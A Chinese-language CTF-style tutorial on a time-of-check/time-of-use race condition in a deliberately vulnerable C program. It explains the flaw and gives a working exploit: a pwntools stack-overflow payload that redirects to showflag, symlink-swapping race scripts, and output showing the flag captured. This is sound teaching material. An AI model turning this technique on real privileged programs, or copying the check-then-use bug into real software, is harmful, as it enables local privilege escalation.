# 題目

## 構造例子

### 源代碼

源代碼如下

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
void showflag() { system("cat flag"); }
void vuln(char *file, char *buf) {
  int number;
  int index = 0;
  int fd = open(file, O_RDONLY);
  if (fd == -1) {
    perror("open file failed!!");
    return;
  }
  while (1) {
    number = read(fd, buf + index, 128);
    if (number <= 0) {
      break;
    }
    index += number;
  }
  buf[index + 1] = '\x00';
}
void check(char *file) {
  struct stat tmp;
  if (strcmp(file, "flag") == 0) {
    puts("file can not be flag!!");
    exit(0);
  }
  stat(file, &tmp);
  if (tmp.st_size > 255) {
    puts("file size is too large!!");
    exit(0);
  }
}
int main(int argc, char *argv[argc]) {
  char buf[256];
  if (argc == 2) {
    check(argv[1]);
    vuln(argv[1], buf);
  } else {
    puts("Usage ./prog <filename>");
  }
  return 0;
}
```

### 分析

可以看出程序的基本流程如下

- 檢查傳入的命令行參數是不是 “flag”，如果是的話，就退出。
- 檢查傳入的命令行參數對應的文件大小是否大於 255，是的話，就直接退出。
- 將命令行參數所對應的文件內容讀入到 buf 中 ，buf 的大小爲 256。

看似我們檢查了文件的大小，同時 buf 的大小也可以滿足對應的最大大小，但是這裏存在一個條件競爭的問題。

如果我們在程序檢查完對應的文件大小後，將對應的文件刪除，並符號鏈接到另外一個更大的文件，那麼程序所讀入的內容就會更多，從而就會產生棧溢出。

### 基本思路

那麼，基本思路來了，我們是想要獲得對應的`flag`的內容。那麼我們只要通過棧溢出修改對應的`main`函數的返回地址即可，通過反彙編以及調試可以獲得`showflag`的地址，獲得對應的payload

```python
➜  racetest cat payload.py 
from pwn import *
test = ELF('./test')
payload = 'a' * 0x100 + 'b' * 8 + p64(test.symbols['showflag'])
open('big', 'w').write(payload)
```

對應兩個條件競爭的腳本爲

```sh
➜  racetest cat exp.sh    
#!/bin/sh
for i in `seq 500`
do
    cp small fake
    sleep 0.000008
    rm fake
    ln -s big fake
    rm fake
done
➜  racetest cat run.sh 
#!/bin/sh
for i in `seq 1000`
do
    ./test fake
done
```

其中 exp 用於來競爭在相應的窗口內刪除 fake 文件，同時執行符號鏈接。run 用來執行程序。

### 具體效果

```shell
➜  racetest (sh exp.sh &) && sh run.sh
[...]
file size is too large!!
open file failed!!: No such file or directory
open file failed!!: No such file or directory
open file failed!!: No such file or directory
open file failed!!: No such file or directory
file size is too large!!
open file failed!!: No such file or directory
open file failed!!: No such file or directory
flag{race_condition_succeed!}
[...]
```

其中成功的關鍵在於對應的 `sleep` 的時間選擇。

## 參考

- http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html
- http://www.cnblogs.com/huxiao-tee/p/4660352.html
- https://github.com/dirtycow/dirtycow.github.io